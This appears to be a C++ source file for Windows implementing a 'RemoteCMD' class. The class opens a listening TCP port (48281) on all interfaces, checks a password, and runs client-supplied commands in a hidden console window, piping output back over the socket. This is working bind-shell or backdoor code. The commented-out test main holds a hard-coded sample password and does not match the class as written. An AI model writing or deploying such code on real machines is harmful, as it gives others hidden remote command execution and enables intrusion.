#include "PublicHead.h"
HWND GetHwndByPid(DWORD dwProcessID)
{
    HWND h = GetTopWindow(0);
    HWND retHwnd = NULL;
    while (h)
    {
        DWORD pid = 0;
        DWORD dwTheardId = GetWindowThreadProcessId(h, &pid);
        if (dwTheardId != 0)
        {
            if (pid == dwProcessID && GetParent(h) == NULL)
            {
                retHwnd = h;
            }
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return retHwnd;
}


class RemoteCMD{
    private:
        static void* PipeRead(void *ClassName){ //HANDLE hStdOutRead, SOCKET sClient
            RemoteCMD *p=(RemoteCMD *)ClassName;
            DWORD dwReaded;
            char buffer[1000];
            while(true){
                if(p->StopSign2 == 0){ break;}
                bool Succ=ReadFile(p->hStdOutRead, buffer,1000, &dwReaded, NULL);
                //buffer[dwReaded] = 0;
                //printf("%s",buffer);
                send(p->sClient, buffer, dwReaded, 0);
                Sleep(50);
            }
            return (void*)0;
        }
    public:
        char Status = 0;
        PROCESS_INFORMATION pi;
        HANDLE hStdOutRead=NULL, hStdOutPipe=NULL;
        HANDLE hStdInWrite=NULL, hStdInPipe=NULL;
        SOCKET sClient;
        pthread_t ThreadMainServer;
        SOCKET slisten;
        pthread_t ThreadPipeRead;
        int StopSign1 = 0, StopSign2 = 0;

        static void* MainServer(void *ClassName){
            RemoteCMD *p=(RemoteCMD *)ClassName;
            //char CMD[8] = "cmd.exe";
            //初始化管道与控制台
            SECURITY_ATTRIBUTES sa;
            sa.nLength = sizeof(SECURITY_ATTRIBUTES);
            sa.bInheritHandle = TRUE;
            sa.lpSecurityDescriptor = NULL;
            STARTUPINFO si;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; //
            si.wShowWindow = SW_HIDE;

            //初始化网络
            WORD sockVersion = MAKEWORD(2,2);
            WSADATA wsaData;
            WSAStartup(sockVersion, &wsaData);


            //创建套接字
            p->slisten = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

            //绑定IP和端口
            sockaddr_in sin;
            sin.sin_family = AF_INET;
            sin.sin_port = htons(48281);//Port
            sin.sin_addr.S_un.S_addr = INADDR_ANY;
            if(bind(p->slisten, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR){
                printf("blind() Failed:%d\n", WSAGetLastError());
                return (void *)1;
            }
            //开始监听
            if(listen(p->slisten, 5) == SOCKET_ERROR){
                printf("blind() Failed:%d\n", WSAGetLastError());
                return (void *)1;
            }
            //循环接收数据
            
            sockaddr_in remoteAddr;
            int nAddrlen = sizeof(remoteAddr);
            char revData[512];
            char *FileData;
            int ret;

            DWORD dwWrited;
            
            while (true){
                if(p->StopSign1 == 0){ break;}
                p->sClient = accept(p->slisten, (SOCKADDR *)&remoteAddr, &nAddrlen);
                //密码验证
                ret = recv(p->sClient, revData, 512, 0);
                revData[ret] = 0;
                if(CheckPassword((unsigned char*)revData,8)!=0){
                    closesocket(p->sClient);
                    continue;
                }
                CreatePipe(&p->hStdOutRead, &p->hStdOutPipe, &sa, 4096);
                CreatePipe(&p->hStdInPipe, &p->hStdInWrite, &sa, 4096);
                si.hStdOutput = p->hStdOutPipe;
                si.hStdInput  = p->hStdInPipe;
                CreateProcess(NULL, revData+8, NULL, NULL, TRUE, CREATE_NEW_CONSOLE|CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &p->pi);
                
                CloseHandle(p->hStdOutPipe);
                p->hStdOutPipe = NULL;
                CloseHandle(p->hStdInPipe);
                p->hStdInPipe = NULL;
                
                p -> StopSign2 = 1;
                pthread_create(&p->ThreadPipeRead, NULL, PipeRead, ClassName);
                while(true){
                    ret = recv(p->sClient, revData, 512, 0);
                    //printf("ret:%d\n",ret);
                    revData[ret] = 0;
                    if(revData[0] == 0 || ret == -1 || p->StopSign1 == 0){
                        //printf("try to close\n");
                        //printf("ID:%d,PID:%d\n", p->pi.dwProcessId, p->pi.hProcess);
                        //int result = TerminateProcess(p->pi.hProcess,0);
                        //printf("result:%d\n",result);
                        //SetConsoleCtrlHandler(CtrlHandler,TRUE);
                        HWND hwnd = GetHwndByPid(p->pi.dwProcessId);
                        PostMessage(hwnd, WM_CLOSE, 0, 0);
                        //printf("hwnd:%d\n",hwnd);
                        //printf("close ok\n");
                        //WriteFile(p->hStdInWrite,"exit\n",5,&dwWrited,NULL);
                        p -> StopSign2 = 0;
                        CloseHandle(p->hStdOutRead);
                        CloseHandle(p->hStdInPipe);
                        CloseHandle(p->pi.hThread);
                        CloseHandle(p->pi.hProcess);
                        p->hStdOutRead = NULL;
                        p->hStdInPipe = NULL;
                        break;
                    }
                    //if(CheckPassword(p->Password,(unsigned char*)revData,8)==0){//
                        //printf("p->hStdInWrite:%d\n",p->hStdInWrite);
                    int Result = WriteFile(p->hStdInWrite,revData,ret,&dwWrited,NULL);
                        //printf("Result:%d\n",Result);
                    //}
                    
                    //printf("%s\n",revData);
                    
                }

            }

            return (void*)0;
        }
        void start(){
            StopSign1 = 1;
            pthread_create(&ThreadMainServer, NULL, MainServer, (void *)this);
            Status = 1;
        }
        void close(){
            //关管道
            DWORD dwWrited;
            StopSign1 = 0;
            StopSign2 = 0;
            
            //关tcp通信
            closesocket(slisten);
            WSACleanup();

            Status = 0;
        }
};
/*int main(){
    unsigned char password[20] ="0123456789abcdef";
    printf("OK");
    RemoteCMD RemoteCMD(password);
    printf("OK");
    while(true){
        printf("Start!\n");
        RemoteCMD.start();
        Sleep(1000000);
        printf("Stop!\n");
        RemoteCMD.close();
        Sleep(5000);
    }
}*/